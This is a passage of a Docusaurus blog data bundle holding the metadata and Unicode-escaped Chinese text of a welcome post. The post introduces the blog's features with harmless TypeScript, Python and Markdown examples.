\ud83d\ude80"},{"id":"welcome-to-my-blog","metadata":{"permalink":"/welcome-to-my-blog","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2025/01-15-welcome.md","source":"@site/blog/2025/01-15-welcome.md","title":"\u6b22\u8fce\u6765\u5230\u6211\u7684\u6280\u672f\u535a\u5ba2","description":"\u6b22\u8fce\u6765\u5230\u6211\u7684\u6280\u672f\u535a\u5ba2\uff01\u8fd9\u662f\u7b2c\u4e00\u7bc7\u535a\u5ba2\u6587\u7ae0\uff0c\u8ba9\u6211\u6765\u4ecb\u7ecd\u4e00\u4e0b\u8fd9\u4e2a\u535a\u5ba2\u7cfb\u7edf\u7684\u529f\u80fd\u3002","date":"2025-01-15T10:00:00.000Z","tags":[{"inline":false,"label":"\u6559\u7a0b","permalink":"/tags/tutorial","description":"\u6280\u672f\u6559\u7a0b\u548c\u6307\u5357"},{"inline":false,"label":"\u524d\u7aef\u5f00\u53d1","permalink":"/tags/frontend","description":"\u524d\u7aef\u5f00\u53d1\u76f8\u5173\u6280\u672f\u6587\u7ae0"},{"inline":false,"label":"\u540e\u7aef\u5f00\u53d1","permalink":"/tags/backend","description":"\u540e\u7aef\u5f00\u53d1\u76f8\u5173\u6280\u672f\u6587\u7ae0"}],"readingTime":1.26,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"welcome-to-my-blog","title":"\u6b22\u8fce\u6765\u5230\u6211\u7684\u6280\u672f\u535a\u5ba2","authors":["autosec"],"tags":["tutorial","frontend","backend"],"date":"2025-01-15T10:00"},"unlisted":false,"prevItem":{"title":"TypeScript \u6700\u4f73\u5b9e\u8df5\u6307\u5357","permalink":"/typescript-best-practices"}},"content":"\u6b22\u8fce\u6765\u5230\u6211\u7684\u6280\u672f\u535a\u5ba2\uff01\u8fd9\u662f\u7b2c\u4e00\u7bc7\u535a\u5ba2\u6587\u7ae0\uff0c\u8ba9\u6211\u6765\u4ecb\u7ecd\u4e00\u4e0b\u8fd9\u4e2a\u535a\u5ba2\u7cfb\u7edf\u7684\u529f\u80fd\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \u535a\u5ba2\u7cfb\u7edf\u7279\u6027\\n\\n\u8fd9\u4e2a\u535a\u5ba2\u7cfb\u7edf\u57fa\u4e8e Docusaurus v2 \u6784\u5efa\uff0c\u5177\u6709\u4ee5\u4e0b\u7279\u6027\uff1a\\n\\n### 1. \u5f3a\u5927\u7684 Markdown \u652f\u6301\\n\\n\u652f\u6301\u6807\u51c6 Markdown \u548c MDX \u8bed\u6cd5\uff0c\u53ef\u4ee5\u5728\u6587\u7ae0\u4e2d\u5d4c\u5165 React \u7ec4\u4ef6\u3002\\n\\n### 2. \u4ee3\u7801\u9ad8\u4eae\\n\\n\u652f\u6301\u591a\u79cd\u7f16\u7a0b\u8bed\u8a00\u7684\u4ee3\u7801\u9ad8\u4eae\uff1a\\n\\n```typescript\\n// TypeScript \u793a\u4f8b\\ninterface BlogPost {\\n  title: string;\\n  date: Date;\\n  tags: string[];\\n  content: string;\\n}\\n\\nconst post: BlogPost = {\\n  title: \\"\u6211\u7684\u7b2c\u4e00\u7bc7\u535a\u5ba2\\",\\n  date: new Date(),\\n  tags: [\\"tutorial\\", \\"typescript\\"],\\n  content: \\"\u8fd9\u662f\u535a\u5ba2\u5185\u5bb9...\\",\\n};\\n```\\n\\n```python\\n# Python \u793a\u4f8b\\ndef hello_world():\\n    print(\\"Hello, World!\\")\\n    \\nif __name__ == \\"__main__\\":\\n    hello_world()\\n```\\n\\n### 3. \u6807\u7b7e\u7cfb\u7edf\\n\\n\u6587\u7ae0\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u6807\u7b7e\uff0c\u65b9\u4fbf\u5206\u7c7b\u548c\u68c0\u7d22\u3002\u70b9\u51fb\u6807\u7b7e\u53ef\u4ee5\u67e5\u770b\u540c\u7c7b\u6587\u7ae0\u3002\\n\\n### 4. \u56fd\u9645\u5316\u652f\u6301\\n\\n\u535a\u5ba2\u652f\u6301\u4e2d\u82f1\u6587\u53cc\u8bed\uff0c\u53ef\u4ee5\u8f7b\u677e\u6269\u5c55\u5230\u66f4\u591a\u8bed\u8a00\u3002\\n\\n### 5. SEO \u4f18\u5316\\n\\n- \u81ea\u52a8\u751f\u6210 sitemap.xml\\n- \u652f\u6301 meta \u6807\u7b7e\u914d\u7f6e\\n- \u8bed\u4e49\u5316 HTML \u7ed3\u6784\\n- RSS/Atom \u8ba2\u9605\u652f\u6301\\n\\n### 6. \u54cd\u5e94\u5f0f\u8bbe\u8ba1\\n\\n\u5b8c\u7f8e\u9002\u914d\u684c\u9762\u3001\u5e73\u677f\u548c\u79fb\u52a8\u8bbe\u5907\u3002\\n\\n## \u5f00\u59cb\u5199\u4f5c\\n\\n\u521b\u5efa\u65b0\u6587\u7ae0\u975e\u5e38\u7b80\u5355\uff0c\u53ea\u9700\u5728 `blog` \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 Markdown \u6587\u4ef6\uff1a\\n\\n```markdown\\n---\\nslug: my-new-post\\ntitle: \u6211\u7684\u65b0\u6587\u7ae0\\nauthors: [autosec]\\ntags: [javascript, react]\\ndate: 2025-01-20T10:00\\n---\\n\\n\u6587\u7ae0\u6458\u8981\u90e8\u5206...\\n\\n\x3c!--truncate--\x3e\\n\\n\u6587\u7ae0\u6b63\u6587\u90e8\u5206...\\n```\\n\\n## \u4e0b\u4e00\u6b65\\n\\n\u63a5\u4e0b\u6765\u6211\u4f1a\u5206\u4eab\u66f4\u591a\u6280\u672f\u6587\u7ae0\uff0c\u656c\u8bf7\u671f\u5f85\uff01\\n\\n---\\n\\n**\u76f8\u5173\u94fe\u63a5\uff1a**\\n- [Docusaurus \u5b98\u65b9\u6587\u6863](https://docusaurus.io/)\\n- [Markdown \u8bed\u6cd5\u6307\u5357](https://www.markdownguide.org/)"}]}}')}}]);